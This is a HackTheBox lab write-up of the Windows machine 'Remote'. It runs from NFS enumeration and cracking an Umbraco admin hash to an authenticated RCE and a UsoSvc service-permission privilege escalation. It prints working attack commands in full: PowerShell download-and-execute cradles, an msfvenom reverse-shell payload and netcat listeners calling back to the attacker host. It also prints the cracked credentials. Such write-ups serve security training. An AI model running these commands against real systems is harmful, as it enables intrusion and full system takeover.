---
title: Remote Machine Writeup- HackTheBox
author: 4m0r
date: 2020-07-31 21:00:00 +0530
excerpt: A windows box from HackTheBox- gained foothold by exploiting vulnerability on Umbraco CMS v7.12.4 and gained 
         SYSTEM access by abusing service permissions of UsoSvc. This is an active machine, so I highly recommend that 
         you try a bit harder before heading inside.
thumbnail: /assets/img/posts/remote/info.png
categories: [HackTheBox, Machine]
tags: [windows, nfs, mount, Umbraco CMS, service permissions, UsoSvc, without metasploit]
---

![Info Card](/assets/img/posts/remote/info.png)

# Methodology
1. Open Ports Enumeration
2. Remote mount point identified
3. Admin credentials for Umbraco CMS identified
4. RCE exploit identified
5. Foothold gained
6. Improper Service Permissions identified
7. SYSTEM access gained

# Lessons Learned
1. Remote NFS mount
2. Scouring and identifying credentials from database file
3. Abusing service permissions

# Open Ports Enumeration
The open ports enumeration of the target[^f1] had identified seven open services, most notably NFS 
and RPCBIND. The scan had not identified any known vulnerabilities for exploitation and the results of the scan are 
given on the section below.
```
[_4m0r@manjaro Remote]$ targetRecon 10.10.10.180 
[+] Open Ports Scan 
        21      ftp 
        80      http 
        111     rpcbind 
        135     msrpc 
        139     netbios-ssn 
        445     microsoft-ds 
        2049    nfs 
[+] Scripts Scan 
                 nmap -sV -A --script=default,vuln -p 21 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:19 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.180 (10.10.10.180) 
Host is up (0.26s latency). 
 
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     Microsoft ftpd 
|_clamav-exec: ERROR: Script execution failed (use -d to debug) 
|_ftp-anon: Anonymous FTP login allowed (FTP code 230) 
| ftp-syst:  
|_  SYST: Windows_NT 
|_sslv2-drown:  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 40.58 seconds 
 
                 nmap -sV -A --script=default,vuln -p 80 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:20 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.180 (10.10.10.180) 
Host is up (0.32s latency). 
                                                                                                                                                                                  
PORT   STATE SERVICE VERSION                                                                                                                                                      
80/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                      
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                              
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                             
| http-enum:                                                                                                                                                                      
|   /blog/: Blog                                                                                                                                                                  
|   /home.aspx: Possible admin folder                                                                                                                                             
|   /contact/: Potentially interesting folder                                                                                                                                     
|   /home/: Potentially interesting folder                                                                                                                                        
|_  /intranet/: Potentially interesting folder                                                                                                                                    
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: Home - Acme Widgets                                                                                                                                                 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                          
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 846.51 seconds                                                                                                                     
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 111 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:34 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.180 (10.10.10.180)                                                                                                                                  
Host is up (0.32s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE VERSION                                                                                                                                                     
111/tcp open  rpcbind 2-4 (RPC #100000)                                                                                                                                           
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
| rpcinfo:                                                                                                                                                                        
|   program version    port/proto  service                                                                                                                                        
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                        
|   100000  2,3,4        111/tcp6  rpcbind                                                                                                                                        
|   100000  2,3,4        111/udp   rpcbind                                                                                                                                        
|   100000  2,3,4        111/udp6  rpcbind                                                                                                                                        
|   100003  2,3         2049/udp   nfs                                                                                                                                            
|   100003  2,3         2049/udp6  nfs                                                                                                                                            
|   100003  2,3,4       2049/tcp   nfs                                                                                                                                            
|   100003  2,3,4       2049/tcp6  nfs                                                                                                                                            
|   100005  1,2,3       2049/tcp   mountd                                                                                                                                         
|   100005  1,2,3       2049/tcp6  mountd                                                                                                                                         
|   100005  1,2,3       2049/udp   mountd                                                                                                                                         
|   100005  1,2,3       2049/udp6  mountd                                                                                                                                         
|   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                                                       
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                                       
|   100021  1,2,3,4     2049/udp   nlockmgr                                                                                                                                       
|   100021  1,2,3,4     2049/udp6  nlockmgr                                                                                                                                       
|   100024  1           2049/tcp   status                                                                                                                                         
|   100024  1           2049/tcp6  status                                                                                                                                         
|   100024  1           2049/udp   status                                                                                                                                         
|_  100024  1           2049/udp6  status                                                                                                                                         
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 285.45 seconds                                                                                                                     
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 135 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:39 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.180 (10.10.10.180)                                                                                                                                  
Host is up (0.34s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE VERSION                                                                                                                                                     
135/tcp open  msrpc   Microsoft Windows RPC                                                                                                                                       
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                          
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 46.38 seconds                                                                                                                      
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 139 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:40 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.180 (10.10.10.180)                                                                                                                                  
Host is up (0.31s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE     VERSION                                                                                                                                                 
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn                                                                                                                           
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                          
                                                                                                                                                                                  
Host script results:                                                                                                                                                              
|_samba-vuln-cve-2012-1182: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!                                                                                   
|_smb-vuln-ms10-054: false                                                                                                                                                        
|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!                                                                                          
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!                                                                                         
|_smb2-time: ERROR: Script execution failed (use -d to debug)                                                                                                                     
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 82.98 seconds                                                                                                                      
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 445 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:41 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.180 (10.10.10.180)                                                                                                                                  
Host is up (0.27s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE       VERSION                                                                                                                                               
445/tcp open  microsoft-ds?                                                                                                                                                       
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
                                                                                                                                                                                  
Host script results:                                                                                                                                                              
|_clock-skew: 1m39s                                                                                                                                                               
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR                                                                                  
|_smb-vuln-ms10-054: false                                                                                                                                                        
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR                                                                                         
| smb2-security-mode:                                                                                                                                                             
|   2.02:                                                                                                                                                                         
|_    Message signing enabled but not required                                                                                                                                    
| smb2-time:                                                                                                                                                                      
|   date: 2020-07-31T14:14:14                                                                                                                                                     
|_  start_date: N/A                                                                                                                                                               
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 82.75 seconds                                                                                                                      
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 2049 10.10.10.180 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 19:42 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.180 (10.10.10.180)                                                                                                                                  
Host is up (0.25s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT     STATE SERVICE VERSION                                                                                                                                                    
2049/tcp open  mountd  1-3 (RPC #100005)                                                                                                                                          
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 42.39 seconds                                                                                                                      
                                                                                                                                                                                  
[+] Summary  
21      ftp     Microsoft ftpd N/A 
                No vuln found 
80      http    Microsoft HTTPAPI httpd 2.0 
                No vuln found 
111     rpcbind N/A N/A 
                No vuln found 
135     msrpc   Microsoft Windows RPC N/A 
                No vuln found 
139     netbios-ssn     Microsoft Windows netbios-ssn N/A 
                No vuln found 
445     microsoft-ds    N/A N/A 
                No vuln found 
2049    nfs     N/A N/A 
                No vuln found
```
Although the FTP service allows *anonymous* login, there neither were any interesting files nor write access. 

# HTTP Service
Browsing to [http://10.10.10.180](http://10.10.10.180) revealed a webpage for **ACME Widgets**, a somewhat elaborate
website from a cursory look. The usual *nikto* and *dirb* scans were initiated and enumeration of other services were
carried while they complete.

# NFS Share
With both *rpcbind* and *nfs* services running, possible export points on the NFS service were enumerated with 
**showmount**. The enumeration identified the export point **/site_backups** with mount access to *everyone*.
```shell 
[_4m0r@manjaro Remote]$ showmount -e 10.10.10.180 
Export list for 10.10.10.180: 
/site_backups (everyone) 
```
The identified export point was mounted on the attacking host using **mount** as follows.
```shell 
[_4m0r@manjaro Remote]$ mkdir /tmp/Remote 
[_4m0r@manjaro Remote]$ sudo mount -t nfs 10.10.10.180:/site_backups /tmp/Remote/ 
[sudo] password for _4m0r: 
[_4m0r@manjaro Remote]$ 
``` 

# Umbraco CMS
The share hosted some directories and files titled as and related to *umbraco*. A basic google-fu revealed that it could
pertain to **Umbraco CMS**. The footer of the webpage, [ACME Widgets](http://10.10.10.180) also confirmed Umbraco's 
presence with the content.
``` shell 
Umbraco HQ - Unicorn Square - Haubergsvej 1 - 5000 Odense C - Denmark - +45 70 26 11 62 
```
The mounted share also had a configuration file, **Web.config**, through which the CMS version was identified as 7.12.4.
```shell 
[_4m0r@manjaro Remote]$ cat Web.config 
---SNIP---
<add key="umbracoConfigurationStatus" value="7.12.4" />
 ---SNIP---
```
A database (sdf) file, **Umbraco.sdf** was identified on the directory **App_Data** under */site_backups*. The contents 
revealed the password hash and email for the **admin** user. The email **admin@htb.local** and the hash 
**b8be16afba8c314ad33d812f22a04991b90e2aaa** were identified from the database file as follows.
```shell 
[_4m0r@manjaro App_Data]$ head Umbraco.sdf  
��V�t�t�y���Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d��׃rf�u�rf�v�rf���rf����X�v�������adminadm
in@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50��BiIf�hVg�v�rf�hVg����X�v�������adminadmin@h
tb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f�[{"alias":"umbIntroIntroduction","completed":fal
se,"disabled":true}]��?�g�.og���g����X�v�������smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.lo
---SNIP---
```
The hash was cracked with *john* using *rockyou.txt* as **baconandcheese**.
```shell 
[_4m0r@manjaro Remote]$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=raw-SHA1 hash  
Created directory: /home/_4m0r/.john 
Using default input encoding: UTF-8 
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) 
Warning: no OpenMP support for this hash type, consider --fork=4 
Press 'q' or Ctrl-C to abort, almost any other key for status 
baconandcheese   (?) 
1g 0:00:00:00 DONE (2020-07-31 19:35) 1.041g/s 10233Kp/s 10233Kc/s 10233KC/s baconandcheese..baconand21 
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably 
Session completed
```

# Initial Foothold
Google-Fu identified an **authenticated RCE** vulnerability for *Umbraco CMS v 7.12.4* and GitHub has a *Python 
script*[^f2] more suited for the purpose of getting a shell. With the identified credentials, 
**admin@htb.local:baconandcheese**, the usability of the exploit was verified by executing *whoami* through it. 
```shell 
[_4m0r@manjaro Remote]$ python exploit.py -h 
usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS] 
 
Umbraco authenticated RCE 
 
optional arguments: 
  -h, --help                 show this help message and exit 
  -u USER, --user USER       username / email 
  -p PASS, --password PASS   password 
  -i URL, --host URL         root URL 
  -c CMD, --command CMD      command 
  -a ARGS, --arguments ARGS  arguments 

[_4m0r@manjaro Remote]$ python exploit.py -i http://10.10.10.180 -u admin@htb.local -p baconandcheese -c whoami         
iis apppool\defaultapppool
```
The powershell file **Invoke-PowerShellTcp.ps1**[^f3] was downloaded on the attacking and the following line was added
to the end of the file to initiate a reverse shell.
```shell 
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.121 -Port 9095
```
A webserver was started using *Python* as `python -m http.server 80` and a *netcat listener* on port 9095 was 
initiated as `nc -nvlp 9095`. Post these setups, the shell was initiated with the exploit as follows.
```shell 
[_4m0r@manjaro Remote]$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.121/Invoke-PowerShellTcp.ps1')"
```
This will download the powershell file from the webserver onto the target and will execute the same, resulting in a
reverse powershell on the netcat listener. The entire process is shown on the section given below.
```shell 
---TERMINAL-1---
[_4m0r@manjaro Remote]$ sudo python -m http.server 80 
[sudo] password for _4m0r:  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 
10.10.10.180 - - [31/Jul/2020 20:22:44] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 
---TERMINAL-2---
[_4m0r@manjaro Remote]$ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180/ -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.121/Invoke-PowerShellTcp.ps1')"

---TERMINAL-3---
[_4m0r@manjaro Remote]$ nc -nvlp 9095 
Connection from 10.10.10.180:49699 
Windows PowerShell running as user REMOTE$ on REMOTE 
Copyright (C) 2015 Microsoft Corporation. All rights reserved. 
 
PS C:\windows\system32\inetsrv>cd C:\Users 
PS C:\Users> cd Public 
PS C:\Users\Public> type user.txt 
d18e3---REDACTED---7c4f4
```
![User Shell](/assets/img/posts/remote/user.png)

# Privilege Escalation
Through the reverse powershell, the script **PowerUp.ps1**[^f4] from *PowerShellEmpire* was downloaded and executed on
the target as follows.
```shell 
PS C:\Users\Public> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.121/PowerUp.ps1')  
```
The script has the **Invoke-AllChecks** module that automates the process of gathering and reporting privilege 
escalation information.
The module was executed and it had identified improper permissions for the service **UsoSvc** and had also
listed a function to abuse the service settings. The same is shown on the section given below.
```shell 
PS C:\Users\Public> Invoke-AllChecks 
 
[*] Running Invoke-AllChecks 
 
 
[*] Checking if user is in a local group with administrative privileges... 
 
 
[*] Checking for unquoted service paths... 
 
 
[*] Checking service executable and argument permissions... 
 
 
[*] Checking service permissions... 
 
 
ServiceName   : UsoSvc 
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p 
StartName     : LocalSystem 
AbuseFunction : Invoke-ServiceAbuse -ServiceName 'UsoSvc'
---SNIP---
```

## SYSTEM Shell
Theoretically, by executing `Invoke-ServiceAbuse -ServiceName 'UsoSvc'` with the `-Command` option, the command 
specified gets executed with *Administrator privileges*. In order to exploit this into a *SYSTEM shell* a payload was
generated with **msfvenom** onto an executable **reverse.exe** as follows.
```shell 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.121 LPORT=9090 -f exe --platform windows > reverse.exe
```
The same is downloaded on the target, using *Invoke-WebRequest*, onto the location *C:\temp* as follows.
```shell 
PS C:\temp> Invoke-WebRequest "http://10.10.14.121/reverse.exe" -OutFile "C:\temp\reverse.exe" 
```
After starting a *netcat listener* on port 9090, the service **UsoSvc** was abused into an Administrator reverse shell
with the following command.
```shell 
PS C:\temp> Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\temp\reverse.exe"
```
This resulted in a reverse shell on the listener as the Administrator, post which the *root flag* was read. The process
is shown on the section given below.
```shell 
---TARGET---
PS C:\temp> Invoke-WebRequest "http://10.10.14.121/reverse.exe" -OutFile "C:\temp\reverse.exe" 
PS C:\temp> ls 
 
 
    Directory: C:\temp 
 
 
Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        7/31/2020  11:24 AM          73802 reverse.exe   

PS C:\temp> Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\temp\reverse.exe"

---ATTACKING HOST---
[_4m0r@manjaro Remote]$ nc -nvlp 9090 
Connection from 10.10.10.180:49711 
Microsoft Windows [Version 10.0.17763.107] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32>cd C:\Users\Administrator\Desktop 
cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop>type root.txt 
type root.txt 
d9e7a---REDACTED---88cd2
```
![Root Shell](/assets/img/posts/remote/root.png)

# Resources
[^f1]:[targetRecon](https://github.com/4m0r/targetRecon)
[^f2]:[Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)
[^f3]:[Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
[^f4]:[PowerUp.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)